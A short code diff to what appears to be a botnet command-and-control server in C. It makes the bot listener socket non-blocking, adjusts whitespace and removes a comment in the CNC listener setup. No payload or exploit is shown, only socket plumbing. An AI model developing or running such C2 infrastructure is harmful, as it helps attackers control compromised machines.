@@ -5,6 +5,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <fcntl.h>
 #include <stdbool.h>
 #include <netinet/tcp.h>
 #include <errno.h>
@@ -177,7 +178,10 @@ void* bot_listener(void* arg) {
         close(bot_server_socket);
         return NULL;
     }
-
+    // Forgot this
+    int flags = fcntl(bot_server_socket, F_GETFL, 0);
+    fcntl(bot_server_socket, F_SETFL, flags | O_NONBLOCK);
+    
     if (listen(bot_server_socket, MAX_BOTS) < 0) {
         perror("Failed to listen on bot server socket");
         close(bot_server_socket);
@@ -277,7 +281,7 @@ void* bot_listener(void* arg) {
                     
                     FD_ZERO(&readfds);
                     FD_SET(*bot_socket, &readfds);
-                    tv.tv_sec = 10;
+                    tv.tv_sec = 10; 
                     tv.tv_usec = 0;
                     
                     if (select(*bot_socket + 1, &readfds, NULL, NULL, &tv) > 0) {
@@ -416,7 +420,6 @@ void* cnc_listener(void* arg) {
     }
 
     int optval = 1;
-    // the most needed options, all OSes must have... (check anyway)
     if (setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0 ||
         setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
         perror("Failed to set CNC socket options");
